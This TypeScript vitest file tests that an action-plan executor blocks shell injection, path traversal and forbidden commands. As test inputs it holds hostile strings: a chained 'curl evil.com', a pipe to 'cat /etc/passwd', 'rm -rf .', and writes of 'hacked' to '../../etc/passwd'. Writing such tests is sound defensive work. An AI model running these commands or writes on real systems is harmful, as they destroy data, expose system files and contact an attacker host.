import { describe, it, expect } from 'vitest';
import { executeActionPlan } from '../src/actions/execute.js';
import fs from 'fs-extra';
import path from 'path';
import os from 'os';

async function withSandbox(fn: (dir: string) => Promise<void>) {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), 'rp-sec-'));
  try {
    await fn(dir);
  } finally {
    await fs.remove(dir);
  }
}

describe('shell command security', () => {
  it('blocks shell operator injection via semicolon', async () => {
    await withSandbox(async (dir) => {
      const result = await executeActionPlan(dir, {
        actions: [{ type: 'run_command', command: 'pnpm test; echo INJECTED' }]
      });
      expect(result.success).toBe(false);
      expect(result.errors.some(e => e.includes('Blocked'))).toBe(true);
    });
  });

  it('blocks shell operator injection via &&', async () => {
    await withSandbox(async (dir) => {
      const result = await executeActionPlan(dir, {
        actions: [{ type: 'run_command', command: 'pnpm test && curl evil.com' }]
      });
      expect(result.success).toBe(false);
    });
  });

  it('blocks shell operator injection via pipe', async () => {
    await withSandbox(async (dir) => {
      const result = await executeActionPlan(dir, {
        actions: [{ type: 'run_command', command: 'pnpm test | cat /etc/passwd' }]
      });
      expect(result.success).toBe(false);
    });
  });

  it('blocks shell operator injection via redirect', async () => {
    await withSandbox(async (dir) => {
      const result = await executeActionPlan(dir, {
        actions: [{ type: 'run_command', command: 'pnpm test > /tmp/evil' }]
      });
      expect(result.success).toBe(false);
    });
  });

  it('blocks forbidden commands like rm', async () => {
    await withSandbox(async (dir) => {
      const result = await executeActionPlan(dir, {
        actions: [{ type: 'run_command', command: 'rm -rf .' }]
      });
      expect(result.success).toBe(false);
    });
  });

  it('blocks git commit', async () => {
    await withSandbox(async (dir) => {
      const result = await executeActionPlan(dir, {
        actions: [{ type: 'run_command', command: 'git commit -m "test"' }]
      });
      expect(result.success).toBe(false);
    });
  });

  it('blocks path traversal writes', async () => {
    await withSandbox(async (dir) => {
      const result = await executeActionPlan(dir, {
        actions: [{ type: 'write_file', path: '../../etc/passwd', content: 'hacked' }]
      });
      expect(result.success).toBe(false);
      expect(result.errors.some(e => e.includes('BLOCKED'))).toBe(true);
    });
  });

  it('blocks absolute path writes', async () => {
    await withSandbox(async (dir) => {
      const result = await executeActionPlan(dir, {
        actions: [{ type: 'write_file', path: '/tmp/evil.txt', content: 'hacked' }]
      });
      expect(result.success).toBe(false);
    });
  });

  it('allows safe commands from allowlist', async () => {
    await withSandbox(async (dir) => {
      // vitest would actually fail (no package.json) but the command should be allowed past security checks
      const result = await executeActionPlan(dir, {
        actions: [{ type: 'run_command', command: 'vitest --version' }]
      });
      // No security block error — execution may fail for other reasons (no vitest installed in sandbox)
      expect(result.errors.every(e => !e.includes('Blocked dangerous command'))).toBe(true);
    });
  });
});
